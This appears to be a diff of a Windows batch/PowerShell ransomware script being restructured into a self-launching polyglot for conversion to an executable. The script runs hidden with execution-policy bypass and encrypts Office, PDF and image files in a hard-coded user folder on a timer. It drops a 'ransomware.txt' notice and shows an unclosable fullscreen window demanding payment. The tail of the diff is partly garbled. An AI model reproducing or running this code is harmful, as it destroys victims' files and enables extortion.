@@ -1,32 +1,67 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFBFTXwiHOXujOpET/+b34OuDsXEVVfZxcYzUug==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFBFTXwiHOXujOpoS7czp5vyC4gBdBtEwbZ3Y3+CyBOUA4VHrZaoMw35TjP8DAxcWewquDg==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+<# : batch portion
 @echo off
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
-"& { ^
-# Enhanced Encryption Script - Timed Encryption with GUI Window ^
-$FolderPath = "C:\Users\jgsleepy\OneDrive - 2Source4\Attachments"^
-$Password = "jgsleepwithme"^
-$IntervalSeconds = 5^
-^
-# File types to encrypt
-$FileTypes = @("*.txt", "*.docx", "*.doc", "*.xlsx", "*.xls", "*.pptx", "*.ppt", "*.png", "*.jpg", "*.jpeg", "*.gif", "*.bmp", "*.pdf")^
-^
-Write-Host "Starting timed encryption process..." -ForegroundColor Cyan^
-Write-Host "GUI window will appear shortly...`n" -ForegroundColor Yellow^
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-Command -ScriptBlock ([ScriptBlock]::Create((Get-Content '%~f0' -Raw)))"
+exit /b
+: end batch / begin powershell #>
 
-# Create notification file on desktop^
-$desktopPath = [Environment]::GetFolderPath("Desktop")^
-$notificationFile = Join-Path $desktopPath "ransomware.txt"^
+# Enhanced Encryption Script - Timed Encryption with GUI Window
+$FolderPath = "C:\Users\jgsleepy\OneDrive - 2Source4\Attachments"
+$Password = "jgsleepwithme"
+$IntervalSeconds = 5
+
+# File types to encrypt
+$FileTypes = @("*.txt", "*.docx", "*.doc", "*.xlsx", "*.xls", "*.pptx", "*.ppt", "*.png", "*.jpg", "*.jpeg", "*.gif", "*.bmp", "*.pdf")
+
+Write-Host "Starting timed encryption process..." -ForegroundColor Cyan
+Write-Host "GUI window will appear shortly...`n" -ForegroundColor Yellow
+
+# Create notification file on desktop
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$notificationFile = Join-Path $desktopPath "ransomware.txt"
 @"
-Encryption in Progress...^
-Files are being encrypted every $IntervalSeconds seconds.^
-"@ | Out-File -FilePath $notificationFile -Encoding UTF8 -Force^
-^
-# Load Windows Forms^
-Add-Type -AssemblyName System.Windows.Forms^
-Add-Type -AssemblyName System.Drawing^
-^
-$screenWidth  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width^
-$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height^
-^
+Encryption in Progress...
+Files are being encrypted every $IntervalSeconds seconds.
+"@ | Out-File -FilePath $notificationFile -Encoding UTF8 -Force
+
+# Load Windows Forms
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$screenWidth  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
+$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
 
 # Create form
 $form = New-Object System.Windows.Forms.Form
@@ -40,9 +75,8 @@ $form.MaximizeBox = $false
 $form.MinimizeBox = $false
 $form.TopMost = $true
 $form.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 20)
-$form.ControlBox = $false  # Disable close button
+$form.ControlBox = $false
 [System.Windows.Forms.Cursor]::Hide()
-
 
 # Total Encrypted Label
 $labelTotal = New-Object System.Windows.Forms.Label
@@ -135,7 +169,6 @@ The faster you pay the more data you will be able to restore,
 $panel.Controls.Add($labelArt)  
 $form.Controls.Add($panel)
 
-
 # Create lock file to signal encryption is active
 $lockFile = Join-Path $desktopPath "encryption.lock"
 "LOCKED" | Out-File -FilePath $lockFile -Encoding UTF8 -Force
@@ -197,7 +230,7 @@ function Encrypt-SingleFile {
 
 # Timer for encryption process
 $timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 1000  # 1 second
+$timer.Interval = 1000
 $script:countdown = $IntervalSeconds
 $script:totalEncrypted = 0
 $script:nextFile = $null
@@ -244,41 +277,6 @@ Encryption Complete
 Total files encrypted: $($script:totalEncrypted)
 Completed at: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 "@ | Out-File -FilePath $notificationFile -Encoding UTF8 -Force
-        }
-        else {
-            $script:nextFile = $script:allFiles | Get-Random
-            $labelNextTarget.Text = "Next Target: $($script:nextFile.Name)"
-            $script:countdown = $IntervalSeconds
-        }
-    }
-    
-    # Check if decryption has been run (lock file removed)
-    if (-not (Test-Path $lockFile)) {
-        $timer.Stop()
-        $form.Close()
-    }
-})
-
-$timer.Start()
-
-# Show form
-$form.Add_FormClosing({
-    param($sender, $e)
-    # Prevent closing unless lock file is removed
-    if (Test-Path $lockFile) {
-        $e.Cancel = $true
-    }
-    else {
-        $timer.Stop()
-    }
-})
-
-
-[void]$form.ShowDialog()
-
-Write-Host "`nEncryption window closed" -ForegroundColor Green
-Write-Host "Total files encrypted: $($script:totalEncrypted)" -ForegroundColor Cyan
-}"TF8 -Force
         }
         else {
             $script:nextFile = $script:allFiles | Get-Random
